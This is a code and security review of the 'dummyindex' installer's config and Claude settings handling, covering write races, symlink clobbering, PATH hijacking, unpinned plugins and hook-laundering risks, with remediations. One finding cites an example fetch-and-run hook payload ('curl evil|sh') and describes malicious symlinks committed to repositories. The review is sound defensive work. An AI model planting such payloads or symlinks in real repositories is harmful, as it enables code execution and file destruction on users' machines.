## Data integrity

There is no relational database in this feature. Its durable state is the
filesystem-backed `.context/config.json` intent ledger and Claude project JSON,
plus external Claude CLI materialisation.

- **High — concurrent config reconcilers can silently lose intent updates.** Both reconciliation helpers read a complete immutable `Config`, derive an appended `wired` tuple, and write the whole document (`dummyindex/context/domains/config.py:567-619`, `dummyindex/context/domains/config.py:622-659`). `write_config` uses the single fixed `config.json.tmp` path and an unguarded replace, with no lock or compare-and-swap (`dummyindex/context/domains/config.py:662-682`). The installer sequences those operations inside one process (`dummyindex/installer/install.py:703-712`), but two install/ingest processes can read the same baseline and commit different ledgers; the last whole-document replacement wins, while the shared temporary path can also be replaced or removed underneath the other writer. Use a unique same-directory temporary file for safe replacement and serialize the full read-modify-write transaction (or reject/retry when the source revision changed).

- **High — project settings merges have the same last-writer-wins race, including with the external Claude CLI.** Hook, marketplace, and plugin operations load the entire JSON object, mutate it in memory, and rewrite it (`dummyindex/context/claude_settings.py:64-112`, `dummyindex/context/claude_plugins.py:105-124`, `dummyindex/context/claude_plugins.py:142-155`). Their common writer again uses one fixed `.json.tmp` sidecar without a lock or revision check (`dummyindex/context/claude_settings.py:175-179`). The default-plugin transaction then invokes project-scoped Claude marketplace/install commands that are documented to target the same project settings (`dummyindex/context/default_plugins.py:637-666`) after in-process declaration (`dummyindex/installer/install.py:720-728`). Concurrent dummyindex runs, hook refreshes, or CLI settings changes can therefore drop unrelated keys even though each individual `replace` is atomic. Protect the complete load/merge/write cycle with a cross-process lock or optimistic revision check; a unique temp file alone fixes collision, not stale-snapshot loss.

- **Medium — the persisted `wired` ledger does not enforce unique target identity.** `Config.__post_init__` validates scope and the tri-state flag but not duplicate `wired` targets (`dummyindex/context/domains/config.py:160-192`), and `_parse_wired` accepts every individually valid entry without a uniqueness pass (`dummyindex/context/domains/config.py:356-375`). Reconciliation prevents only newly appended duplicates via a transient target set (`dummyindex/context/domains/config.py:606-618`, `dummyindex/context/domains/config.py:641-658`), so pre-existing duplicate or contradictory records survive indefinitely. Declaration iterates every record (`dummyindex/context/default_plugins.py:511-548`) while materialisation collapses plugin targets to a set (`dummyindex/context/default_plugins.py:701-707`), which can produce inconsistent classifications/reporting for the same identity. Reject duplicate targets on parse, or normalize them with an explicit deterministic precedence and migration.

- **User-scope `CLAUDE.md` is NOT a managed-block — it's a sentinel-substring guard + bare append.** _(Partly resolved by commit 1a2c212: the bare-`"dummyindex"` denial-of-registration / non-reentrancy half is fixed.)_ The probe now gates on `if "**dummyindex** (" in content` (`dummyindex/installer/install.py:383`) — the unique opening of the `_SKILL_REGISTRATION` bullet, not any occurrence of the literal string — so a file that mentions "dummyindex" in a code fence, a path, or an unrelated note is no longer wrongly skipped; the block lands exactly once and is not re-appended. What remains: when the probe does not match, registration is still a bare `content.rstrip() + _SKILL_REGISTRATION` append (`dummyindex/installer/install.py:386`) with **no** begin/end markers anywhere in `_SKILL_REGISTRATION` (`dummyindex/installer/common.py:53-64`), so it is still non-updatable (an already-present block is never refreshed on upgrade) and uninstall can never remove it — `uninstall()` never touches `~/.claude/CLAUDE.md` (`dummyindex/installer/uninstall.py:20-79`). Contrast the project-side managed block, which `reconcile_claude_md` writes between `BEGIN_MARKER`/`END_MARKER` and refreshes in place (`dummyindex/context/output/claude_md.py:96-269`, `dummyindex/context/output/bootstrap.py:14-18`, `dummyindex/context/output/bootstrap.py:82-132`) — the user-scope registration does not yet use that mechanism. This build widens the asymmetry rather than closing it: a user-scope install now writes two user-global guidance surfaces side by side (`dummyindex/installer/install.py:198-201`), and the Codex one *is* a marker-delimited managed block that can be refreshed and removed (`dummyindex/context/output/agents_md.py:166-182`), while the Claude one still is not. Code wins — the registration is sentinel-guarded but still marker-less (low-confidence residual gap).

- **Parse-failure handling is correct and consistent: refuse, never corrupt.** `load_settings` raises `MalformedSettingsError` on invalid JSON or a non-object top level (`dummyindex/context/claude_settings.py:39-61`); every write path goes through it first, so an unparseable `settings.json` is left byte-for-byte intact. `wire_default_plugins` (`dummyindex/context/default_plugins.py:523-524`, `dummyindex/context/default_plugins.py:533-534`, `dummyindex/context/default_plugins.py:545-546`), `hooks.install` (`dummyindex/context/hooks.py:438-439`), `_scrub_legacy_claude_hooks` (`dummyindex/context/hooks.py:467-470`), and `hooks.uninstall` (`dummyindex/context/hooks.py:532-536`) each catch it and record an error rather than overwrite. `_already_decided` treats a malformed file as "no decision" (`dummyindex/context/default_plugins.py:319-322`) — correct, since it never *writes* on that path. No silent-corruption path found here. This build did not change any of those catch sites.

- **Managed-hook idempotency is sound, including the co-located-user-hook merge.** `install_hook_entry` matches our entry by `SENTINEL in command` and refreshes the body *per-hook* — canonical hooks first, non-sentinel user hooks appended (`dummyindex/context/claude_settings.py:92-113`) — explicitly avoiding the v0.25.0 wholesale-replace bug that dropped a user hook co-located in our entry. `remove_hook_entries` mirrors it, stripping only sentinel hooks and keeping the entry when a user hook survives (`dummyindex/context/claude_settings.py:116-172`, `dummyindex/context/hooks.py:503-543`). The `install` refreshed-vs-skipped classification compares on-disk bytes before and after (`dummyindex/context/hooks.py:429-437`) rather than against the canonical body, so it reports honestly once a user co-locates a hook. No concern. Note this is the countervailing property to Security finding 6, which treats the same substring-recognition seam as an attack surface: the merge is correct *as idempotency*, and unsafe *as an authorisation test*.

## Security

1. **High — predictable config/settings temporary files let a repository symlink clobber an arbitrary user-writable file before the atomic replace.** Both persistence writers derive a fixed sibling name, call `write_text` on it, and only then rename it over the destination (`dummyindex/context/domains/config.py:662-682`, `dummyindex/context/claude_settings.py:175-179`). An attacker can commit `.claude/settings.json.tmp -> ../../victim` in a repo with no current managed hooks; install’s first hook write follows the symlink and truncates `victim` with JSON, then renames the symlink over `settings.json`. An enriched repo can analogously carry `.context/config.json.tmp` and a config state that triggers migration/reconciliation. **Load-bearing mitigation today:** malformed destination JSON fails closed before settings mutation, and the final rename is atomic, but neither prevents following the attacker-controlled temporary symlink during the preceding write (`dummyindex/context/claude_settings.py:39-61`, `dummyindex/context/hooks.py:376-430`, `dummyindex/installer/install.py:703-712`). Create unique sibling temps with exclusive/no-follow semantics and publish through the already-open verified directory.

2. **High — a repository-controlled `.claude` directory symlink redirects managed-hook and plugin-setting writes outside the repository.** Hook installation selects `<project>/.claude/settings.json` and writes it through the shared settings mutator before the plugin pass (`dummyindex/context/hooks.py:376-430`, `dummyindex/context/claude_settings.py:64-113`); `wire_default_plugins` later uses the same unbounded target for marketplaces and enabled plugins (`dummyindex/context/default_plugins.py:472-548`). A clone containing `.claude -> ../victim-config` therefore makes ordinary auto-init create or rewrite `victim-config/settings.json`, after which the project-scoped Claude CLI also operates through the redirected project path. **Load-bearing mitigation today:** malformed JSON and same-name marketplace conflicts fail closed (`dummyindex/context/default_plugins.py:373-410`), while installer symlink validation covers only selected skill/command destinations, not repository integration state (`dummyindex/installer/install.py:104-193`, `dummyindex/installer/install.py:581-601`, `dummyindex/installer/install.py:666-734`). Resolve every integration target against the project boundary and bind writes to verified no-follow directory handles.

3. **Medium — the default path executes whichever `claude` binary wins inherited `PATH`.** The availability probe runs bare `claude --version`, and marketplace/install calls use the same unresolved executable name (`dummyindex/context/default_plugins.py:626-628`, `dummyindex/context/default_plugins.py:637-666`). `default_runner` changes into the repository and inherits the process environment while invoking list argv (`dummyindex/context/default_plugins.py:589-605`). A repository paired with a launcher or direnv configuration that puts the repository first on `PATH` therefore gains code execution as soon as the default-plugin pass probes availability. **Load-bearing mitigation today:** list argv avoids shell interpolation, execution is timeout-bounded, immediate plugin targets are allowlisted to the reviewed tuple, and reviewed code-running surfaces are disclosed before mutation (`dummyindex/context/default_plugins.py:148-215`, `dummyindex/installer/install.py:698-701`). The former "third-party refs are full SHAs" mitigation no longer exists: the `ref` field and its 40-char-SHA validation were deleted (`dummyindex/context/default_plugins.py:121-163`), so the pin can no longer be cited here — see finding 4, which arguably raises this finding's severity rather than lowering it. None of the remaining mitigations authenticates the executable, so resolve an approved absolute Claude CLI path before entering repository context and run it with a minimal explicit environment. **Second trust gap on the same path — declaration-then-install honours an attacker's pre-seeded decision.** `_already_decided` makes dummyindex treat any `enabledPlugins` key already present in the *committed* `settings.json` as sacrosanct and leaves it as-is (`dummyindex/context/default_plugins.py:307-325`, `dummyindex/context/default_plugins.py:328-340`), and `wire_default_plugins` iterates only `config.wired` — it never inspects, reports, or warns about `enabledPlugins` keys that are not reviewed defaults (`dummyindex/context/default_plugins.py:472-554`). Materialisation likewise filters `selected` down to the frozen `DEFAULT_PLUGINS` tuple (`dummyindex/context/default_plugins.py:701-707`), so dummyindex will not itself install a foreign target — **but** the broader equip/plugin-manager path shares the same `enable_plugin` seam (`dummyindex/context/claude_plugins.py:142-156`) and Claude Code's own next-session reconcile *will* install whatever `enabledPlugins` declares. The danger is the framing: a user running `dummyindex install` on an untrusted clone reasonably believes only dummyindex's own opinionated default is enabled, while a pre-committed `enabledPlugins` block silently rides along untouched and is later installed by Claude Code. Remediation: have `wire_default_plugins` warn — not silently classify as `already` — when it finds foreign (non-`DEFAULT_PLUGINS`) `enabledPlugins` keys in a repo it is initialising, so a smuggled enable is disclosed. This gap is distinct from the Product-surface bullet on deleted-key-vs-`false`-tombstone reverts, which concerns the team's *own* prior decision rather than an attacker's.

4. **High — reviewed third-party defaults now track a mutable upstream branch, so once-reviewed code can change under the user with no dummyindex release.** `DefaultPlugin` no longer carries a `ref`, and `_validate_default_plugins` validates only unique targets and non-empty surfaces (`dummyindex/context/default_plugins.py:121-146`, `dummyindex/context/default_plugins.py:148-159`). `_expected_source` declares the unpinned shape `{"source": "github", "repo": <slug>}`, and `_declare_marketplace` actively *heals* a legacy commit-SHA pin of the same repo into that unpinned shape (`dummyindex/context/default_plugins.py:348-351`, `dummyindex/context/default_plugins.py:373-410`). Materialisation then runs `claude plugin marketplace add <repo> --scope project` followed by `claude plugin install <target> --scope project` (`dummyindex/context/default_plugins.py:637-666`), so what lands on the machine is whatever the upstream default branch holds at that moment — including `caveman`'s reviewed `SessionStart` and `UserPromptSubmit` Node command hooks, which then execute on every session (`dummyindex/context/default_plugins.py:173-184`). An upstream account compromise or an ordinary upstream commit changes executed code without a dummyindex review, diff, or version bump. **Load-bearing mitigation today:** the pin removal was deliberate and the lost property was nominal, not enforced — Claude Code materialises marketplaces with `git clone --branch <ref>`, which can never clone a commit SHA, so the previous pin meant every third-party default silently failed to install rather than installing something immutable. What still holds: the target set is allowlisted to the reviewed tuple, the source repo, reviewed surfaces, and `runs_code` are disclosed before any mutation, and `--no-default-plugins` skips the entire pass (`dummyindex/context/default_plugins.py:196-215`, `dummyindex/installer/install.py:666-681`). Restoring integrity needs a mechanism Claude Code actually honours — a clonable pinned tag, or post-clone content verification — not a reinstated `ref` field.

5. **Medium — `--dedupe` deletes a whole skill family on content-sniffed ownership evidence and never re-verifies the siblings it removes.** Ownership is proven by a `.dummyindex_version` stamp **or** the mere presence of a `## Codex host compatibility` heading anywhere in the family's `SKILL.md` (`dummyindex/installer/repair.py:481-505`, `dummyindex/installer/repair.py:647-648`), and that predicate is what promotes a directory to a removable duplicate (`dummyindex/installer/repair.py:620-644`). `_remove_skill_family` then recursively removes that host's main skill tree plus each of the seven `dummyindex-*` siblings named in the fixed `_SIBLING_SKILLS` tuple under that scope root, without checking any sibling for its own evidence — the sweep iterates a fixed name list, not a `dummyindex-*` glob, so an unrelated vendored directory whose name merely starts with `dummyindex-` is left untouched (`dummyindex/installer/uninstall.py:141-157`, `dummyindex/installer/uninstall.py:169-184`, `dummyindex/installer/common.py:42-50`). A repository that vendors, forks, or documents a legacy skill copy — the heading is plain markdown that any clone can carry — therefore surrenders that host's main skill directory and all seven named siblings at that root, local edits included, the first time someone runs `--dedupe project` there. **Load-bearing mitigation today:** removal never happens implicitly — it requires the explicit `--dedupe user|project` flag, the family must be proven present at *both* scopes, removal is filtered to the invocation's `--platform` selection, the symlink preflight is re-run per family and refuses rather than removes, each family's failure is isolated, and `_same_root` fails closed so a home==project layout is a silent no-op (`dummyindex/installer/repair.py:369-443`, `dummyindex/installer/repair.py:651-663`). Strengthen the evidence itself: require the version stamp for *deletion* (keep the heading only for rewrite self-healing) and prove each sibling before removing it.

6. **High — THREAT 1: hook-command injection via `$CLAUDE_PROJECT_DIR` not being shell-quoted is mitigated, but the hook bodies execute as fully-trusted shell on every session-start and are sentinel-recognised by an attacker-controllable substring.** The managed hook commands embed `"$CLAUDE_PROJECT_DIR"` inside double quotes for every invocation (`dummyindex/context/hooks.py:104,115,129,145,158,175,198`), so the path itself can't break the argv — good. The real exposure is the *recognition + scrub* model: install/uninstall/status select "our" entries by the bare substring test `SENTINEL in (h.get("command") or "")` (`dummyindex/context/claude_settings.py:94,99,146`), and `SENTINEL = "DUMMYINDEX_AUTO_REFRESH"` (`dummyindex/context/hooks.py:55`) is a fixed, publicly-known literal embedded verbatim in the comment header (`dummyindex/context/hooks.py:61-64`). Attack path: a malicious repo (or a supply-chain commit) ships a `.claude/settings.json` whose own arbitrary hook command merely *contains* the string `DUMMYINDEX_AUTO_REFRESH` (e.g. in a comment) and a payload like `curl evil|sh`. On the victim's `dummyindex install`/upgrade, `install_hook_entry`'s preserve-merge treats that hook as one of OURS-or-not purely by substring: a hook that lacks the sentinel is *preserved verbatim* and re-emitted into the merged entry (`dummyindex/context/claude_settings.py:96-104`) — dummyindex never validates or sandboxes the user hook bodies it carries forward, and Claude Code will execute them with the user's full privileges on the next SessionStart/Stop. dummyindex is not the one *adding* the payload, but it is the component that silently re-writes attacker hook commands back into `settings.json` during a trusted "upgrade my tooling" operation, laundering them past a user who assumes `dummyindex install` only touches its own entries. Concrete remediation: (a) match managed entries on a structured key (e.g. a dedicated `"_dummyindex": true` field on the entry) rather than a substring anyone can spell; (b) when preserving co-located non-sentinel hooks, surface them to stderr ("preserving N user hook(s) in the dummyindex entry") so a re-emitted `curl|sh` is at least visible, not silent.

7. **Medium — THREAT 3: `settings.json` is written world-default-permissioned and non-atomically at the write step, and the CLAUDE.md substring guard is a denial-of-registration / poisoning primitive.** Two concrete issues. (a) **Permissions + the write_text half-step:** `write_settings` does `tmp.write_text(...)` then `tmp.replace(settings_path)` (`dummyindex/context/claude_settings.py:177-179`). The `replace` is atomic for the *swap*, but the tmp file is created with the process umask (typically `0644`) — a `.claude/settings.json` that carries the user's hooks and enabled plugins (i.e. code that auto-executes every session) is left group/other-readable, and on a shared/multi-user host any local user can read which tooling and project paths the victim runs, and if `.claude/` is group-writable, race the fixed-name `settings.json.tmp` (see finding 1) to land a hook of their choosing. dummyindex never `chmod 600`s the file it writes despite it being security-sensitive. `write_config` has the identical shape for `.context/config.json`, which carries the same enabled-plugin intent ledger (`dummyindex/context/domains/config.py:677-681`), and neither writer nor any caller in this feature narrows the mode of either file. (b) **CLAUDE.md poisoning (narrowed by commit 1a2c212, not eliminated):** the probe now gates on `if "**dummyindex** (" in content` (`dummyindex/installer/install.py:383`), so the trivial suppression vector — a single line containing the bare word `dummyindex` — no longer blocks registration. The residual gap: the append at `dummyindex/installer/install.py:386` still has no markers, so an attacker who writes a line containing the exact sentinel `"**dummyindex** ("` can still suppress the real registration, and nothing can later detect or remove a stale/forged block. This is low-severity (local, requires write to the user's own home) but remains a silent integrity gap: the install reports "already registered (no change)" (`dummyindex/installer/install.py:384`) while the file may contain a forged or broken registration. Remediation: write `settings.json` (and its tmp) with mode `0o600` via `os.open(..., 0o600)` / `os.chmod`; give the user-scope registration the same `BEGIN_MARKER`/`END_MARKER` managed block `reconcile_claude_md` uses on the project side (`dummyindex/context/output/claude_md.py:96-269`) so registration is detectable, refreshable, and removable.

## Product surface

- **A first-time Claude user follows the README install command — neither the reviewed default identities nor the PATH-resolved external CLI execution are disclosed on that first-contact surface before installation starts — the user cannot make an informed pre-run opt-out decision or verify which executable will perform materialisation.** The README quickstart names only the bare `dummyindex install --platform claude|agents|both` commands (`README.md:12-24`, `README.md:71-95`), and `install --help` describes “default Claude plugins” generically (`dummyindex/installer/args.py:10-38`). Runtime trust lines identify *unpinned* third-party sources — `describe_default_plugin_trust()` emits `default plugin trust -> <target> from <repo> (tracks latest); reviewed surfaces: …` (`dummyindex/context/default_plugins.py:196-215`) — plus reviewed surfaces, code execution, and the one-run opt-out, but appear only after skill placement and project initialization have begun (`dummyindex/installer/install.py:157-220`, `dummyindex/installer/install.py:666-734`). They do not identify the bare `claude` executable that is resolved from inherited `PATH` and launched from the repository for availability, marketplace, and install operations (`dummyindex/context/default_plugins.py:589-605`, `dummyindex/context/default_plugins.py:626-666`).

- **A project build, guidance write, hook install, settings merge, or plugin materialisation fails during `dummyindex install` — warnings or “auto-init skipped” are emitted, then the command still prints `Done` and exits successfully — callers cannot distinguish “skill files copied” from “project ready” through the final status or exit code.** `_auto_init_project` returns `False` for import/refresh/build failures but treats guidance, hook, plugin, and equipment failures as best-effort before returning `True` (`dummyindex/installer/install.py:406-534`); plugin failures are warning-only (`dummyindex/installer/install.py:703-734`). The installer prints the same `Done` footer for both outcomes and only explains the skip when the target is not a repository (`dummyindex/installer/install.py:233-262`), while the command dispatcher returns without propagating a structured partial-success result (`dummyindex/__main__.py:289-312`). The repair and dedupe passes added to every run report through the same print-only channel: `describe_plan` lines and per-copy stderr reports are the sole signal that a stale or duplicated copy was found or that a rewrite was skipped (`dummyindex/installer/install.py:171-187`, `dummyindex/installer/repair.py:323-366`, `dummyindex/installer/repair.py:446-479`).

- **A user runs install while another install, hook refresh, or Claude project-settings write is in flight — each actor reads and later replaces the complete config or settings document without a lock or revision check, so one successful write can silently erase the other — neither command output nor the final `Done` footer reports a conflict or verifies that unrelated keys survived.** Config reconciliation performs whole-document read/derive/write transactions through one fixed temporary path (`dummyindex/context/domains/config.py:567-682`), while hook and plugin operations independently merge then replace the full `.claude/settings.json` snapshot (`dummyindex/context/claude_settings.py:64-112`, `dummyindex/context/claude_settings.py:175-179`, `dummyindex/context/claude_plugins.py:105-155`). Materialisation then invokes project-scoped Claude marketplace/install commands against the same repository (`dummyindex/context/default_plugins.py:637-666`). The installer sequences its own steps but has no cross-process coordination or final state audit (`dummyindex/installer/install.py:233-262`, `dummyindex/installer/install.py:703-734`).

- **A user opts out with `--no-default-plugins`, then later reinstalls or updates without remembering the flag — the CLI opt-out applies to one run and an absent persisted value defaults back to enabled — there is no CLI operation that records a durable opt-out or changes one default independently.** The public option explicitly says “for this run” (`dummyindex/installer/args.py:21-37`), and `resolve_enabled` treats a missing config value as enabled (`dummyindex/context/default_plugins.py:272-281`). Durable control exists through manual `.context/config.json` or Claude settings edits in the detailed guide, so the product surface exposes persistence as file-format knowledge rather than an install/config command.

- **Re-install / upgrade re-runs the full init every time and re-enables a default the team may have intentionally removed — but only if they *deleted* the key, not set it false.** `_effective_enabled` treats an `enabledPlugins[target]` that is present-and-`false` in either project or local settings as a decision and returns `False`, and `wire_default_plugins` then leaves that target alone (`dummyindex/context/default_plugins.py:328-340`, `dummyindex/context/default_plugins.py:472-554`) — so an explicit opt-out survives upgrade. But a team that removed the key entirely (e.g. hand-pruned settings.json, or migrated config) reads back as `None`, i.e. "no decision", and the next `dummyindex install` / `/dummyindex-update` silently re-enables it (`dummyindex/context/default_plugins.py:544`) and re-materialises it (`dummyindex/context/default_plugins.py:676-760`). Observed behavior: on every upgrade, a repo carrying no key for a reviewed default gets the plugin re-added and re-materialised via the `claude` CLI; the only way to make removal stick is the non-obvious `enabledPlugins.<target> = false` tombstone. Gap: at the settings layer "deleted the key" and "never decided" are indistinguishable, so opt-out-by-deletion silently reverts on the next upgrade — a surprising side effect for a command framed as non-destructive. This is a different surface from the `--no-default-plugins` bullet above: that one is the CLI/`config.json` opt-out, this one is the settings-level revert.

- **A Claude user runs the documented uninstall after auto-init — the skill family and slash-command aliases are removed, while project guidance, executable hooks, and plugin declarations remain — there is no single supported teardown command for the installed project surface.** Uninstall help accurately warns that Claude guidance and hooks stay intact (`dummyindex/installer/args.py:40-55`), and the implementation removes skills and commands but never invokes hook or plugin cleanup (`dummyindex/installer/uninstall.py:20-166`). Project-guidance cleanup is partial and host-asymmetric: when the agents/codex platform is selected, `uninstall()` does remove dummyindex's managed `AGENTS.md` blocks via `_remove_codex_guidance` (`dummyindex/installer/uninstall.py:68-74`, `dummyindex/installer/uninstall.py:187-236`), and `uninstall --help` says so (`dummyindex/installer/args.py:44-46`); for a Claude-only uninstall no guidance is removed at all, which is the scenario this bullet describes. Hooks have a separate public `context hooks uninstall` verb, but `context bootstrap` only writes guidance and exposes no removal verb (`dummyindex/cli/hooks.py:1-90`, `dummyindex/cli/bootstrap.py:1-71`); uninstall output also reports only the first removed path. The result is an uneven teardown path in which hooks can continue running after the owning skill is gone and the remaining managed state must be discovered and handled separately. The user-scope `~/.claude/CLAUDE.md` registration is a fourth artefact left behind, and unlike the other three it is not reachable by any future teardown because it carries no markers (see the Data-integrity bullet on user-scope `CLAUDE.md`).

- **`--scope project` installs skill+commands into the repo but the user-scope CLAUDE.md skill registration is skipped — discoverability of `/dummyindex` then depends entirely on the project managed block.** The CLAUDE.md *registration* append (`dummyindex/installer/install.py:379-391`) is gated on `scope == "user"` (`dummyindex/installer/install.py:198-201`); under `--scope project` it is never written, and the project managed block is only written when the target is a git repo (`dummyindex/installer/install.py:212`) via auto-init's `reconcile_claude_md` consolidation (`dummyindex/installer/install.py:473-478` on the enriched branch; `dummyindex/installer/install.py:498-504` and `dummyindex/installer/install.py:514-515` via `build_all` on the full-build branch). Observed behavior: `dummyindex install --scope project --dir <non-repo>` lands the skill but registers it in no CLAUDE.md anywhere — the `/dummyindex` trigger guidance is absent. Gap: a project-scope install into a non-repo dir leaves the skill present but undiscovered, and the install log never says "skill not registered in any CLAUDE.md for this scope."

## Cross-review notes

The Security review flagged two operator-facing primitives that compound the product-surface gaps above:

- **Sentinel-substring laundering meets one-directional uninstall.** Security finding 6 (THREAT 1) shows `dummyindex install`/upgrade re-emits any co-located non-sentinel hook verbatim while preserving the managed entry (`dummyindex/context/claude_settings.py:96-104`). Combined with the Product-surface finding that `uninstall.py` never removes hooks at all, the operator impact is: a hook body that rode in (laundered or user-authored) on one upgrade is *never* cleaned by `dummyindex uninstall` — the only removal path (`hooks.uninstall`) is unreachable from the uninstall verb.
